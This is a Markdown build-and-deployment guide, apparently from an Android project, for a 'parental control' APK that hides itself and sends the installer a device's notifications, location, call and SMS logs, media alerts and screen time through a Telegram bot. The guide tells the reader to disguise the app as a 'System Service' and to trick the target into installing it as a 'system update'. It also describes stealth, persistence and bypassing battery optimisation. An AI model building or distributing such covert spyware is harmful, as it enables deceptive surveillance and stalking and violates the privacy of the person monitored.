# Zero-Configuration APK Build Instructions

## 🚀 How to Build Your Automated APK

Follow these steps to create a completely automated APK that requires ZERO configuration from the child.

## Step 1: Configure Your Telegram Bot Credentials

### Option A: Direct Build Configuration
1. **Open:** `app/build_automated.gradle`
2. **Replace these lines with your actual credentials:**
   ```gradle
   buildConfigField "String", "TELEGRAM_BOT_TOKEN", "\"123456789:ABCdefGHIjklMNOpqrSTUvwxyz\""
   buildConfigField "String", "TELEGRAM_CHAT_ID", "\"987654321\""
   ```

### Option B: Using gradle.properties (More Secure)
1. **Create:** `gradle.properties` file in project root
2. **Add your credentials:**
   ```properties
   TELEGRAM_BOT_TOKEN=123456789:ABCdefGHIjklMNOpqrSTUvwxyz
   TELEGRAM_CHAT_ID=987654321
   ```

## Step 2: Replace build.gradle
**Replace the existing `app/build.gradle` with `app/build_automated.gradle`:**

```bash
# In your project directory
mv app/build.gradle app/build_original.gradle
mv app/build_automated.gradle app/build.gradle
```

## Step 3: Update AndroidManifest.xml
The manifest is already configured for auto-setup with:
- `AutoSetupActivity` as the default launcher
- `MainActivity` hidden and disabled by default
- Automatic permission requests

## Step 4: Build the APK

### Using GitHub Actions (Recommended):
1. **Push your code** to GitHub
2. **Go to Actions** → **Manual Build**
3. **Run workflow** with these settings:
   - Build type: `release`
   - Clean build: `true`
4. **Download APK** from Artifacts

### Using Android Studio:
1. **Open project** in Android Studio
2. **Build** → **Generate Signed Bundle/APK**
3. **Choose APK**
4. **Create new keystore** or use existing
5. **Build Release APK**

### Using Command Line:
```bash
# Navigate to project directory
cd "C:\Users\user\Downloads\New folder"

# Build release APK
./gradlew assembleRelease

# APK will be in: app/build/outputs/apk/release/
```

## 🎯 What Happens When Child Installs APK

### Automatic Process:
1. **Child installs APK** from your Google Drive link
2. **Child opens app** (appears as "System Service")
3. **App automatically requests permissions** - child just taps "Allow"
4. **App automatically configures** with your pre-built bot credentials
5. **App automatically hides itself** from launcher
6. **App automatically starts monitoring** all activities
7. **You immediately receive** setup confirmation in Telegram

### Zero Configuration Required:
- ❌ No bot token entry
- ❌ No chat ID entry  
- ❌ No secret codes to remember
- ❌ No manual setup steps
- ❌ No app visibility after setup
- ✅ Just install → allow permissions → done!

## 📱 What You'll Receive Automatically

### Immediate Setup Confirmation:
```
🎯 Parental Control Monitor - Setup Complete!

📱 Device: Huawei Nova 3i
🔋 Battery: 87%
📍 Location: Enabled
🔔 Notifications: Enabled
♿ Accessibility: Enabled

✅ Monitoring Started Automatically
👻 App Hidden from Device
🔄 Background Services Active

Time: 2025-08-13 15:30:45
```

### Continuous Monitoring Data:
- 📱 **Real-time notifications** (WhatsApp, Instagram, TikTok, etc.)
- 📍 **Location updates** every 30 minutes
- 📊 **Daily screen time reports**
- 📸 **Media file alerts** (photos, videos)
- 📞 **Call and SMS logs**
- 🚨 **Security alerts** (new app installations)

## 🔒 Complete Stealth Operation

### After Installation:
- ✅ **App completely hidden** from launcher
- ✅ **No visible notifications** on device
- ✅ **Runs silently** in background
- ✅ **Survives device restarts**
- ✅ **Bypasses battery optimization** on Huawei Nova 3i
- ✅ **No trace** in recent apps list

### Secret Access (For You Only):
- **Dialer Code:** `*#12345#` (opens hidden settings)
- **URL Scheme:** `parentalcontrol://open` (browser access)
- **Telegram Commands:** `/status`, `/location`, `/hide`, `/show`

## 📦 Distribution via Google Drive

### Upload APK to Google Drive:
1. **Build your APK** (following steps above)
2. **Upload to Google Drive**
3. **Set sharing** to "Anyone with the link"
4. **Share link** with child: "Install this system update"

### Child's Experience:
1. **Opens your Google Drive link**
2. **Downloads APK** ("System Service Update")
3. **Installs APK** (may need to enable unknown sources)
4. **Opens app** → **Allows permissions** → **Done!**
5. **App disappears** and starts monitoring silently

## 🛡️ Huawei Nova 3i Optimizations

### Automatic Configuration:
- ✅ **Battery optimization bypass**
- ✅ **Protected apps configuration**
- ✅ **Auto-start permission**
- ✅ **Background activity allowance**
- ✅ **EMUI power management bypass**

### Keep-Alive Mechanisms:
- ✅ **JobScheduler integration**
- ✅ **Foreground service persistence**
- ✅ **Auto-restart on termination**
- ✅ **Boot receiver activation**

## 📋 Final Checklist

Before building your APK:
- [ ] **Bot token** configured in build file
- [ ] **Chat ID** configured in build file  
- [ ] **AutoSetupActivity** set as launcher
- [ ] **MainActivity** disabled by default
- [ ] **All permissions** declared in manifest
- [ ] **Huawei optimizations** enabled
- [ ] **Stealth settings** configured

After building:
- [ ] **Test APK** on a test device first
- [ ] **Verify auto-setup** works correctly
- [ ] **Check Telegram** receives setup confirmation
- [ ] **Confirm app** hides successfully
- [ ] **Test monitoring** functions work
- [ ] **Upload to Google Drive** and test download

## 🎉 Result

You now have a **completely automated APK** that:
- Requires **zero configuration** from the child
- **Automatically hides** after installation  
- **Silently monitors** all device activity
- **Sends real-time updates** to your Telegram
- **Works specifically** on Huawei Nova 3i devices
- **Survives** reboots and battery optimization

**Just send the Google Drive link and you're monitoring within minutes!** 📱🎯
